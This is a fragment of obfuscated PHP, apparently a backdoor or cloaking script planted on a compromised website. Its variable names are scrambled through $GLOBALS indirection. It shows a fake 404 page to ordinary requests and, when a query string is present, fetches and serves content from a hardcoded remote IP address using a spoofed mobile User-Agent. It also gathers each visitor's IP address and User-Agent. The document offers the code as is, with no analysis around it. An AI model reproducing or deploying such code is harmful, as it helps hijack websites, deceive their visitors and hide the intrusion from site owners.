...
if(strlen($_SERVER["QUERY_STRING"])==0){error_404();
}${${"GLOBALS"}["frtdlntnn"]}="http://78.138.127.174/2701dfbvcxff.php";
php_display(${${"GLOBALS"}["frtdlntnn"]});
error_404();
function php_display($url){${"GLOBALS"}["raarljmr"]="query";
${"GLOBALS"}["kghdwca"]="url";
...
if(strlen(${${"GLOBALS"}["utmelghg"]})<10){error_404();
}${${"GLOBALS"}["vlqopxmxgrd"]}=explode("\n",${${"GLOBALS"}["vlqopxmxgrd"]});
${$kjkunvv}=array_shift(${${"GLOBALS"}["vlqopxmxgrd"]});
${${"GLOBALS"}["zqhblgefkyfd"]}=implode("\n",${$sxxpvocik});
if(strstr(${${"GLOBALS"}["unvrvgmd"]},".html")===FALSE){${"GLOBALS"}["mkuwusknikkm"]="content";
$cdwvgbn="filename";
...
exit();
}function error_404(){${"GLOBALS"}["ekigsyougde"]="content";
...
exit(${$mlpyciogd});
}function custom_http_request($params){${"GLOBALS"}["rpbduqeew"]="params";
...
$gltisxmf="url";
if(!is_array(${${"GLOBALS"}["skithlp"]})){$ifhixrdyp="params";
${$ifhixrdyp}=array("url"=>${${"GLOBALS"}["dkybtjey"]},"method"=>"GET");
}${"GLOBALS"}["yepdcevuxpl"]="url";
${"GLOBALS"}["vihctkjfhvvy"]="params";
if(${${"GLOBALS"}["kfmdcq"]}["url"]=="")return FALSE;
$ubxlgnhuyr="params";
if(!isset(${${"GLOBALS"}["dkybtjey"]}["method"]))${$ubxlgnhuyr}["method"]=(isset(${${"GLOBALS"}["xxehovhjncm"]}["data"])&&is_array(${${"GLOBALS"}["dkybtjey"]}["data"]))?"POST":"GET";
$cskpgqwdqo="params";
${${"GLOBALS"}["vihctkjfhvvy"]}["method"]=strtoupper(${${"GLOBALS"}["dkybtjey"]}["method"]);
if(!in_array(${${"GLOBALS"}["dkybtjey"]}["method"],array("GET","POST")))return FALSE;
$epiobcqrqlz="url";
${$gltisxmf}=parse_url(${$cskpgqwdqo}["url"]);
${"GLOBALS"}["nxufvtacx"]="res";
${"GLOBALS"}["sfluwzoaoune"]="params";
if(!isset(${${"GLOBALS"}["adalfphu"]}["scheme"]))${${"GLOBALS"}["adalfphu"]}["scheme"]="http";
if(!isset(${${"GLOBALS"}["imarwteum"]}["path"]))${${"GLOBALS"}["adalfphu"]}["path"]="/";
${"GLOBALS"}["niyefoisfi"]="url";
$tkjjnyhwfoag="scheme";
if(!isset(${${"GLOBALS"}["adalfphu"]}["host"])&&isset(${$epiobcqrqlz}["path"])){${"GLOBALS"}["pgldxeumkut"]="url";
if(strpos(${${"GLOBALS"}["pgldxeumkut"]}["path"],"/")){$nrkejedmbdu="url";
...
if(!isset(${${"GLOBALS"}["dkybtjey"]}["return"]))${${"GLOBALS"}["dkybtjey"]}["return"]="content";
...
if(${$bupjnclc}){${"GLOBALS"}["ywkmwgmun"]="fp";
$wrywtprn="request";
${"GLOBALS"}["ctwpwmfpd"]="request";
$rcewvwoncgs="request";
$klaxtlfng="params";
$ejtawqkjvwv="params";
if(!isset(${$klaxtlfng}["User-Agent"]))${$ejtawqkjvwv}["User-Agent"]="Mozilla/5.0 (iPhone;
 U;
...
if(isset(${${"GLOBALS"}["bqwdrkh"]}["referer"]))${${"GLOBALS"}["ctwpwmfpd"]}.="Referer: {$params['referer']}\r\n";
${"GLOBALS"}["sfgjshen"]="params";
if(isset(${${"GLOBALS"}["dkybtjey"]}["cookie"])){${"GLOBALS"}["xbuxsue"]="cookie";
$izixaouwju="params";
${${"GLOBALS"}["kmmjtmc"]}="";
$uydzdxtjj="cookie";
$qfbaog="request";
if(is_array(${$izixaouwju}["cookie"])){$etxefpr="cookie";
$qvsaebfw="cookie";
${"GLOBALS"}["whhxdeqplxdm"]="k";
$qsnkils="params";
$oqcnxxdgy="v";
foreach(${$qsnkils}["cookie"]as${${"GLOBALS"}["whhxdeqplxdm"]}=>${$oqcnxxdgy})${$qvsaebfw}.="$k=$v;
 ";
$tymuackpyyx="cookie";
${$tymuackpyyx}=substr(${$etxefpr},0,-2);
}else${$uydzdxtjj}=${${"GLOBALS"}["dkybtjey"]}["cookie"];
if(${${"GLOBALS"}["xbuxsue"]}!="")${$qfbaog}.="Cookie: $cookie\r\n";
}${${"GLOBALS"}["cirsgdg"]}.="Connection: close\r\n";
if(${${"GLOBALS"}["njmbwqgsjh"]}["method"]=="POST"){${"GLOBALS"}["vwhhfisif"]="data";
if(isset(${${"GLOBALS"}["dkybtjey"]}["data"])&&is_array(${${"GLOBALS"}["dkybtjey"]}["data"])){${"GLOBALS"}["mgmnrst"]="v";
$rwdexltep="data";
${"GLOBALS"}["jmhoexxptj"]="data";
$cbkyxubxa="data";
${"GLOBALS"}["lbctcbl"]="data";
${"GLOBALS"}["hplxqfn"]="k";
foreach(${${"GLOBALS"}["dkybtjey"]}["data"]AS${${"GLOBALS"}["hplxqfn"]}=>${${"GLOBALS"}["dmkoegsts"]})${$cbkyxubxa}.=urlencode(${${"GLOBALS"}["duzghq"]})."=".urlencode(${${"GLOBALS"}["mgmnrst"]})."&";
if(substr(${${"GLOBALS"}["jmhoexxptj"]},-1)=="&")${$rwdexltep}=substr(${${"GLOBALS"}["lbctcbl"]},0,-1);
}${${"GLOBALS"}["vwhhfisif"]}.="\r\n\r\n";
...
$ugvdzmbig="params";
if(${$khgqovuhu}["return"]=="headers"||${${"GLOBALS"}["dkybtjey"]}["return"]=="array"||(isset(${$ugvdzmbig}["redirect"])&&${${"GLOBALS"}["dkybtjey"]}["redirect"]==true)){$tsbiwulfowhr="v";
${"GLOBALS"}["iqrhxdf"]="h";
$tuykrk="headers";
$frfdskiwxv="k";
...
foreach(${${"GLOBALS"}["gkwyvse"]} as${$frfdskiwxv}=>${$tsbiwulfowhr}){$dicebo="v";
if(strpos(${$dicebo},":")){$ojxubpulg="v";
...
}}if(isset(${${"GLOBALS"}["zhraky"]}["redirect"])&&${${"GLOBALS"}["dkybtjey"]}["redirect"]==true&&isset(${${"GLOBALS"}["bjkmsyafdmuw"]}["LOCATION"])){${"GLOBALS"}["ssmmvued"]="params";
${${"GLOBALS"}["dkybtjey"]}["url"]=${${"GLOBALS"}["bjkmsyafdmuw"]}["LOCATION"];
if(!isset(${${"GLOBALS"}["dkybtjey"]}["redirect-count"]))${${"GLOBALS"}["ssmmvued"]}["redirect-count"]=0;
if(${${"GLOBALS"}["dkybtjey"]}["redirect-count"]<10){${${"GLOBALS"}["dkybtjey"]}["redirect-count"]++;
$jetmhydib="func";
$bfdsupd="params";
$rzdgnapdmw="params";
${$jetmhydib}=__FUNCTION__;
return@is_object($this)?$this->${${"GLOBALS"}["fpczfknke"]}(${$bfdsupd}):${${"GLOBALS"}["fpczfknke"]}(${$rzdgnapdmw});
}}if(${${"GLOBALS"}["dkybtjey"]}["return"]=="headers")return${${"GLOBALS"}["ceotabbpqud"]};
}}@fclose(${${"GLOBALS"}["ywkmwgmun"]});
}else return FALSE;
if(${${"GLOBALS"}["sfluwzoaoune"]}["return"]=="array")${$pgcnydrskkow}=array("headers"=>${$moewmhtgse},"content"=>${${"GLOBALS"}["nxufvtacx"]});
return${${"GLOBALS"}["jskpbxwrosfw"]};
}function getUseragent(){return$_SERVER["HTTP_USER_AGENT"];
}function getIp(){$nzpdlvvn="ip";
${"GLOBALS"}["jfrgotjwgfeb"]="ip";
${${"GLOBALS"}["zaqukohkkj"]}=NULL;
if(isset($_SERVER["REMOTE_ADDR"])){${${"GLOBALS"}["zaqukohkkj"]}=$_SERVER["REMOTE_ADDR"];
}if(strpos(${$nzpdlvvn},",")!==FALSE){${"GLOBALS"}["fpparhroiyb"]="ip";
